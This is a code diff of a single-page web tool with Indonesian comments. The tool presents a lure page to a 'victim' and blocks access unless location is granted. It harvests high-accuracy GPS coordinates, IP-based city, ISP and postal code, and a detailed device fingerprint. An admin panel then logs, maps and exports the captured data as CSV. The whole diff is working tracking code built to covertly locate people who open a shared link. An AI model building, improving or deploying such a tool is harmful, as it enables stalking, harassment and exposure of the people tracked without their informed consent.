+    ipISP:     d.org          || null,
+    ipLat:     d.latitude     || null,
+    ipLng:     d.longitude    || null,
+    ipTZ:      d.timezone     || null,
+    ipPostal:  d.postal       || null,
+  };
+}
+
+function getDevice() {
+  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  // RAM: deviceMemory bisa undefined di beberapa browser — fallback ke string kosong
+  const ram  = navigator.deviceMemory
+    ? navigator.deviceMemory + 'GB'
+    : (performance && performance.memory
+        ? Math.round(performance.memory.jsHeapSizeLimit / 1073741824) + 'GB (est)'
+        : null);
+  return {
+    ua:        navigator.userAgent,
+    screen:    screen.width + 'x' + screen.height,
+    colorDepth: screen.colorDepth || null,
+    lang:      navigator.language,
+    tz:        Intl.DateTimeFormat().resolvedOptions().timeZone,
+    ram:       ram,
+    cpu:       navigator.hardwareConcurrency || null,
+    touch:     navigator.maxTouchPoints > 0,
+    platform:  navigator.platform || null,
+    online:    navigator.onLine,
+    cookieOk:  navigator.cookieEnabled,
+    connType:  conn ? (conn.effectiveType || conn.type || null) : null,
+    connDown:  conn ? (conn.downlink || null) : null,
+    referrer:  document.referrer || null,
+  };
+}
+
+// ── ADMIN ──
 function showAdmin() {
   document.getElementById('victim-page').classList.add('hidden');
   document.getElementById('admin-panel').classList.add('visible');
   populateForm();
+  updateLinkDisplay();
   renderLogs();
-  updatePreview();
-
-  // real-time storage listener (multi-tab)
-  window.addEventListener('storage', (e) => {
-    if (e.key === LOG_KEY) {
-      loadLogs();
-      renderLogs();
-      flashGeo();
-    }
+  window.addEventListener('storage', e => {
+    if (e.key === LOG_KEY) { loadLogs(); renderLogs(); flashLive(); }
   });
 }
 
@@ -809,292 +376,169 @@ function exitAdmin() {
 }
 
 function populateForm() {
-  document.getElementById('target-url').value       = config.targetUrl      || '';
-  document.getElementById('loading-text').value     = config.loadingText    || '';
-  document.getElementById('loading-subtext').value  = config.loadingSub     || '';
-  document.getElementById('delay-sec').value        = config.delaySec       || 3;
-  document.getElementById('toggle-geo').checked     = config.geoEnabled     !== false;
-  document.getElementById('toggle-high-acc').checked= config.highAccuracy   !== false;
-  document.getElementById('toggle-force-redirect').checked = config.forceRedirect !== false;
+  document.getElementById('target-url').value        = config.targetUrl       || '';
+  document.getElementById('loading-text').value      = config.loadingText     || '';
+  document.getElementById('loading-subtext').value   = config.loadingSub      || '';
+  document.getElementById('blocked-text-cfg').value  = config.blockedText     || '';
+  document.getElementById('toggle-high-acc').checked = config.highAccuracy    !== false;
+  document.getElementById('toggle-block').checked    = config.blockOnDeny     !== false;
 }
 
 function saveConfig() {
-  config.targetUrl     = document.getElementById('target-url').value.trim();
-  config.loadingText   = document.getElementById('loading-text').value.trim()    || 'Memuat konten...';
-  config.loadingSub    = document.getElementById('loading-subtext').value.trim() || 'Mohon tunggu sebentar';
-  config.delaySec      = parseFloat(document.getElementById('delay-sec').value)  || 3;
-  config.geoEnabled    = document.getElementById('toggle-geo').checked;
-  config.highAccuracy  = document.getElementById('toggle-high-acc').checked;
-  config.forceRedirect = document.getElementById('toggle-force-redirect').checked;
-
+  config.targetUrl   = document.getElementById('target-url').value.trim();
+  config.loadingText = document.getElementById('loading-text').value.trim()     || 'Memuat konten...';
+  config.loadingSub  = document.getElementById('loading-subtext').value.trim()  || 'Mohon tunggu sebentar';
+  config.blockedText = document.getElementById('blocked-text-cfg').value.trim() || 'Akses lokasi diperlukan.';
+  config.highAccuracy= document.getElementById('toggle-high-acc').checked;
+  config.blockOnDeny = document.getElementById('toggle-block').checked;
   localStorage.setItem(STORAGE_KEY, JSON.stringify(config));
-  updatePreview();
-  showToast('Konfigurasi disimpan');
+  updateLinkDisplay();
+  showToast('Tersimpan');
 }
 
-function updatePreview() {
+function updateLinkDisplay() {
   const base = window.location.href.split('#')[0];
-  const card = document.getElementById('link-card');
-  const disp = document.getElementById('generated-link-display');
-
-  card.style.display = 'block';
-  disp.innerHTML = `<span>${base}</span>`;
+  document.getElementById('link-display').textContent = base;
 }
 
 function copyLink() {
   const base = window.location.href.split('#')[0];
-  navigator.clipboard.writeText(base).then(() => showToast('Link disalin!')).catch(() => {
-    // fallback
-    const ta = document.createElement('textarea');
-    ta.value = base;
-    document.body.appendChild(ta);
-    ta.select();
-    document.execCommand('copy');
-    document.body.removeChild(ta);
-    showToast('Link disalin!');
+  navigator.clipboard.writeText(base).catch(() => {
+    const t = document.createElement('textarea');
+    t.value = base; document.body.appendChild(t); t.select();
+    document.execCommand('copy'); document.body.removeChild(t);
   });
+  showToast('Link disalin!');
 }
 
-// ══════════════════════════════════════
-//  LOGS
-// ══════════════════════════════════════
+function flashLive() {
+  const el = document.getElementById('live-ind');
+  el.style.color = 'var(--green)';
+  el.textContent = '● Data masuk!';
+  setTimeout(() => { el.style.color = 'var(--muted)'; el.textContent = '● Standby'; }, 3000);
+}
+
+// ── LOGS ──
 function saveLog(entry) {
-  loadLogs(); // refresh dulu biar tidak overwrite dari tab lain
+  loadLogs();
   logs.push(entry);
-  // simpan max 200 entri
-  if (logs.length > 200) logs = logs.slice(-200);
+  if (logs.length > 300) logs = logs.slice(-300);
   localStorage.setItem(LOG_KEY, JSON.stringify(logs));
 }
 
 function loadLogs() {
-  try {
-    const raw = localStorage.getItem(LOG_KEY);
-    logs = raw ? JSON.parse(raw) : [];
-  } catch { logs = []; }
+  try { logs = JSON.parse(localStorage.getItem(LOG_KEY) || '[]'); } catch { logs = []; }
 }
 
 function clearLogs() {
   if (!confirm('Hapus semua log?')) return;
-  logs = [];
-  localStorage.removeItem(LOG_KEY);
-  renderLogs();
-  showToast('Log dihapus');
-}
-
-function loadConfig() {
-  try {
-    const raw = localStorage.getItem(STORAGE_KEY);
-    if (raw) Object.assign(config, JSON.parse(raw));
-  } catch {}
+  logs = []; localStorage.removeItem(LOG_KEY); renderLogs(); showToast('Log dihapus');
 }
 
 function renderLogs() {
-  const container = document.getElementById('log-container');
-  const count = document.getElementById('log-count');
+  const c = document.getElementById('log-container');
+  document.getElementById('log-count').textContent = logs.length + ' entri';
+  if (!logs.length) { c.innerHTML = '<div class="empty-state">Belum ada data.</div>'; return; }
 
-  if (!logs.length) {
-    container.innerHTML = '<div class="empty-state">Belum ada data. Tunggu korban buka link.</div>';
-    count.textContent = '0 entri';
-    return;
-  }
-
-  count.textContent = `${logs.length} entri`;
-
-  // terbalik — terbaru di atas
   const sorted = [...logs].reverse();
+  let html = `<table class="log-table"><thead><tr>
+    <th>#</th><th>Waktu</th><th>GPS</th><th>Akurasi</th>
+    <th>IP</th><th>Lokasi IP</th><th>ISP</th>
+    <th>Timezone</th><th>Device</th><th>RAM</th><th>CPU</th><th>Touch</th><th>Koneksi</th><th>Status</th>
+  </tr></thead><tbody>`;
 
-  let html = `<table class="log-table">
-    <thead>
-      <tr>
-        <th>#</th>
-        <th>Waktu</th>
-        <th>GPS</th>
-        <th>Akurasi</th>
-        <th>IP / Lokasi IP</th>
-        <th>ISP</th>
-        <th>Timezone</th>
-        <th>Device</th>
-        <th>Hardware</th>
-        <th>Koneksi</th>
-        <th>Status</th>
-      </tr>
-    </thead>
-    <tbody>`;
-
-  sorted.forEach((entry, i) => {
+  sorted.forEach((e, i) => {
     const num  = logs.length - i;
-    const time = entry.ts ? new Date(entry.ts).toLocaleString('id-ID') : '—';
+    const time = e.ts ? new Date(e.ts).toLocaleString('id-ID') : '—';
+    const tzCity = e.tz ? e.tz.split('/').pop().replace(/_/g,' ') : (e.ipTZ ? e.ipTZ.split('/').pop().replace(/_/g,' ') : '—');
+    const ipLoc  = [e.ipCity, e.ipRegion, e.ipCountry].filter(Boolean).join(', ') || '—';
+    const conn   = e.connType ? e.connType.toUpperCase() + (e.connDown ? ' ' + e.connDown + 'Mbps' : '') : '—';
 
-    // clean timezone: "Asia/Jakarta" → "Asia / Jakarta"
-    const tzRaw   = entry.tz || '—';
-    const tzClean = tzRaw.replace('_', ' ').replace('/', ' / ');
-    const tzCity  = tzRaw.includes('/') ? tzRaw.split('/').pop().replace('_',' ') : tzRaw;
+    const hasGPS = e.lat != null;
+    const status = hasGPS
+      ? `<span class="acc-badge acc-high">✓ GPS+IP</span>`
+      : `<span class="acc-badge acc-low">${e.error || 'Gagal'}</span>`;
 
-    // koneksi label
-    const connLabel = entry.connType
-      ? `${entry.connType.toUpperCase()}${entry.connDown ? ` · ${entry.connDown}Mbps` : ''}`
+    const gpsCell = hasGPS
+      ? `<span class="coord-val">${e.lat.toFixed(5)},<br>${e.lng.toFixed(5)}</span><br>
+         <a href="https://www.google.com/maps?q=${e.lat},${e.lng}" target="_blank" class="map-link">↗ Maps</a>`
+      : `<span style="color:var(--muted)">—</span>`;
+
+    const acc = hasGPS
+      ? `<span class="acc-badge ${e.accuracy < 20 ? 'acc-high' : e.accuracy < 100 ? 'acc-mid' : 'acc-low'}">±${Math.round(e.accuracy)}m</span>`
       : '—';
 
-    if (entry.error) {
-      const errLabel = entry.code === 1 ? 'Ditolak' :
-                       entry.code === 2 ? 'Tdk tersedia' :
-                       entry.code === 3 ? 'Timeout' : 'Error';
-      const ipLocErr = [entry.ipCity, entry.ipRegion, entry.ipCountry].filter(Boolean).join(', ') || '—';
-      html += `<tr>
-        <td style="color:var(--muted)">${num}</td>
-        <td style="font-size:11px">${time}</td>
-        <td style="color:var(--muted)">—</td>
-        <td><span class="acc-badge acc-low">${errLabel}</span></td>
-        <td style="font-size:11px">
-          ${entry.ip ? `<span class="coord-val">${entry.ip}</span><br>` : ''}
-          <span style="color:var(--text)">${ipLocErr}</span>
-          ${entry.ipLat ? `<br><a href="https://www.google.com/maps?q=${entry.ipLat},${entry.ipLng}" target="_blank" class="map-link">↗ Maps (IP)</a>` : ''}
-        </td>
-        <td style="font-size:11px;color:var(--muted)">${entry.ipISP || '—'}</td>
-        <td style="font-size:11px">
-          <span style="color:var(--text)">${tzCity}</span><br>
-          <span style="color:var(--muted)">${entry.lang || '—'}</span>
-        </td>
-        <td style="font-size:11px;color:var(--muted)" title="${escHtml(entry.ua||'')}">
-          ${entry.screen || '—'}<br>${shortUA(entry.ua)}
-        </td>
-        <td style="font-size:11px;color:var(--muted)">
-          ${entry.ram ? `RAM ${entry.ram}` : '—'}<br>
-          ${entry.cpu ? `${entry.cpu} core` : ''}
-          ${entry.touch !== undefined ? ` · ${entry.touch ? '👆' : '🖱️'}` : ''}
-        </td>
-        <td style="font-size:11px;color:var(--muted)">${connLabel}</td>
-        <td><span class="acc-badge acc-low">Geo Gagal</span></td>
-      </tr>`;
-    } else {
-      const lat      = entry.lat?.toFixed(6) ?? '—';
-      const lng      = entry.lng?.toFixed(6) ?? '—';
-      const acc      = entry.accuracy ? `±${Math.round(entry.accuracy)}m` : '—';
-      const accClass = (entry.accuracy && entry.accuracy < 50) ? 'acc-high' : 'acc-low';
-      const mapUrl   = entry.lat ? `https://www.google.com/maps?q=${entry.lat},${entry.lng}` : null;
+    const ipMapsLink = e.ipLat
+      ? `<br><a href="https://www.google.com/maps?q=${e.ipLat},${e.ipLng}" target="_blank" class="map-link">↗ Maps</a>`
+      : '';
 
-      const ipLoc = [entry.ipCity, entry.ipRegion, entry.ipCountry].filter(Boolean).join(', ') || '—';
-      html += `<tr>
-        <td style="color:var(--muted)">${num}</td>
-        <td style="font-size:11px">${time}</td>
-        <td>
-          <span class="coord-val">${lat},<br>${lng}</span><br>
-          ${mapUrl ? `<a href="${mapUrl}" target="_blank" class="map-link">↗ Maps (GPS)</a>` : ''}
-        </td>
-        <td><span class="acc-badge ${accClass}">${acc}</span></td>
-        <td style="font-size:11px">
-          ${entry.ip ? `<span class="coord-val">${entry.ip}</span><br>` : ''}
-          <span style="color:var(--text)">${ipLoc}</span>
-          ${entry.ipPostal ? `<span style="color:var(--muted)"> ${entry.ipPostal}</span>` : ''}
-          ${entry.ipLat ? `<br><a href="https://www.google.com/maps?q=${entry.ipLat},${entry.ipLng}" target="_blank" class="map-link">↗ Maps (IP)</a>` : ''}
-        </td>
-        <td style="font-size:11px;color:var(--muted)">${entry.ipISP || '—'}</td>
-        <td style="font-size:11px">
-          <span style="color:var(--text)">${tzCity}</span><br>
-          <span style="color:var(--muted)">${tzClean}</span><br>
-          <span style="color:var(--muted)">${entry.lang || '—'}</span>
-        </td>
-        <td style="font-size:11px" title="${escHtml(entry.ua||'')}">
-          <span style="color:var(--text)">${entry.screen || '—'}</span><br>
-          <span style="color:var(--muted)">${shortUA(entry.ua)}</span>
-        </td>
-        <td style="font-size:11px">
-          ${entry.ram ? `<span style="color:var(--green)">RAM ${entry.ram}</span><br>` : ''}
-          ${entry.cpu ? `<span style="color:var(--text)">${entry.cpu} core</span>` : ''}
-          ${entry.touch !== undefined ? `<br><span style="color:var(--muted)">${entry.touch ? '👆 Touch' : '🖱️ Non-touch'}</span>` : ''}
-        </td>
-        <td style="font-size:11px">
-          ${entry.connType ? `<span style="color:var(--text)">${entry.connType.toUpperCase()}</span>` : '—'}
-          ${entry.connDown ? `<br><span style="color:var(--muted)">${entry.connDown} Mbps</span>` : ''}
-        </td>
-        <td><span class="acc-badge acc-high">✓ GPS + IP</span></td>
-      </tr>`;
-    }
+    html += `<tr>
+      <td style="color:var(--muted)">${num}</td>
+      <td style="font-size:10px;white-space:nowrap">${time}</td>
+      <td>${gpsCell}</td>
+      <td>${acc}</td>
+      <td><span class="ip-val">${e.ip || '—'}</span></td>
+      <td style="font-size:10px">${ipLoc}${ipMapsLink}</td>
+      <td style="font-size:10px;color:var(--muted);max-width:140px">${e.ipISP || '—'}</td>
+      <td style="font-size:10px">${tzCity}<br><span style="color:var(--muted)">${e.lang || '—'}</span></td>
+      <td style="font-size:10px;max-width:120px" title="${escH(e.ua||'')}">${shortUA(e.ua)}<br><span style="color:var(--muted)">${e.screen||'—'}</span></td>
+      <td style="font-size:10px;color:${e.ram?'var(--green)':'var(--muted)'}">${e.ram||'—'}</td>
+      <td style="font-size:10px">${e.cpu ? e.cpu+' core' : '—'}</td>
+      <td style="font-size:10px">${e.touch !== undefined ? (e.touch?'👆':'🖱️') : '—'}</td>
+      <td style="font-size:10px">${conn}</td>
+      <td>${status}</td>
+    </tr>`;
   });
 
   html += '</tbody></table>';
-  container.innerHTML = html;
+  c.innerHTML = html;
 }
 
-function flashGeo() {
-  const dot   = document.getElementById('geo-dot');
-  const label = document.getElementById('geo-label');
-  dot.classList.remove('inactive');
-  dot.classList.add('active');
-  label.textContent = 'Geo: Aktif';
-  setTimeout(() => {
-    dot.classList.remove('active');
-    dot.classList.add('inactive');
-    label.textContent = 'Geo: Standby';
-  }, 3000);
-}
-
-// ══════════════════════════════════════
-//  EXPORT
-// ══════════════════════════════════════
+// ── EXPORT ──
 function exportCSV() {
   if (!logs.length) { showToast('Tidak ada data'); return; }
-
-  const headers = ['No','Waktu','Latitude','Longitude','Akurasi(m)','Timezone','Lang','Screen','RAM','CPU','Touch','Koneksi','UserAgent','Status','Error'];
-  const rows = logs.map((e, i) => [
-    i + 1,
-    e.ts ? new Date(e.ts).toLocaleString('id-ID') : '',
-    e.lat ?? '',
-    e.lng ?? '',
-    e.accuracy ? Math.round(e.accuracy) : '',
-    e.tz ?? '',
-    e.lang ?? '',
-    e.screen ?? '',
-    e.ram ?? '',
-    e.cpu ?? '',
-    e.touch !== undefined ? (e.touch ? 'Touch' : 'Non-touch') : '',
-    e.connType ?? '',
-    e.connDown ? `${e.connDown} Mbps` : '',
-    (e.ua ?? '').replace(/"/g, '""'),
-    e.error ? 'Gagal' : 'Sukses',
-    e.error ?? '',
+  const h = ['No','Waktu','Lat','Lng','Akurasi(m)','IP','Kota IP','Region IP','Negara IP','ISP','Lat IP','Lng IP','Timezone','Lang','Device','Screen','RAM','CPU','Touch','Koneksi','Kecepatan','Status','Error'];
+  const rows = logs.map((e,i) => [
+    i+1, e.ts ? new Date(e.ts).toLocaleString('id-ID') : '',
+    e.lat||'', e.lng||'', e.accuracy ? Math.round(e.accuracy) : '',
+    e.ip||'', e.ipCity||'', e.ipRegion||'', e.ipCountry||'', e.ipISP||'',
+    e.ipLat||'', e.ipLng||'', e.tz||'', e.lang||'',
+    (e.ua||'').replace(/"/g,'""'), e.screen||'',
+    e.ram||'', e.cpu||'', e.touch!==undefined?(e.touch?'Touch':'Non-touch'):'',
+    e.connType||'', e.connDown||'',
+    e.lat ? 'Sukses' : 'Gagal', e.error||''
   ]);
-
-  let csv = headers.join(',') + '\n';
-  rows.forEach(r => {
-    csv += r.map(v => `"${v}"`).join(',') + '\n';
+  let csv = h.join(',') + '\n' + rows.map(r => r.map(v => `"${v}"`).join(',')).join('\n');
+  const a = Object.assign(document.createElement('a'), {
+    href: URL.createObjectURL(new Blob([csv], {type:'text/csv;charset=utf-8;'})),
+    download: 'location_log_' + Date.now() + '.csv'
   });
-
-  const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
-  const url  = URL.createObjectURL(blob);
-  const a    = document.createElement('a');
-  a.href     = url;
-  a.download = `location_log_${Date.now()}.csv`;
-  a.click();
-  URL.revokeObjectURL(url);
+  a.click(); URL.revokeObjectURL(a.href);
   showToast('CSV diexport');
 }
 
-// ══════════════════════════════════════
-//  UTILS
-// ══════════════════════════════════════
+// ── UTILS ──
+function loadConfig() {
+  try { Object.assign(config, JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}')); } catch {}
+}
+
 function shortUA(ua) {
   if (!ua) return '—';
   if (/iPhone/.test(ua))  return 'iPhone';
   if (/iPad/.test(ua))    return 'iPad';
-  if (/Android/.test(ua)) {
-    const m = ua.match(/Android[^;]*;\s*([^)]+)\)/);
-    return m ? m[1].trim().substring(0, 20) : 'Android';
-  }
-  if (/Windows/.test(ua)) return 'Windows PC';
+  if (/Android/.test(ua)) { const m = ua.match(/Android[^;]*;\s*([^)]+)\)/); return m ? m[1].trim().slice(0,18) : 'Android'; }
+  if (/Windows/.test(ua)) return 'Windows';
   if (/Mac/.test(ua))     return 'Mac';
-  if (/Linux/.test(ua))   return 'Linux';
-  return ua.substring(0, 20) + '…';
+  return ua.slice(0,18)+'…';
 }
 
-function escHtml(s) {
+function escH(s) {
   return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
 }
 
 function showToast(msg) {
   const t = document.getElementById('toast');
-  t.textContent = msg;
-  t.classList.add('show');
+  t.textContent = msg; t.classList.add('show');
   setTimeout(() => t.classList.remove('show'), 2000);
 }
 </script>
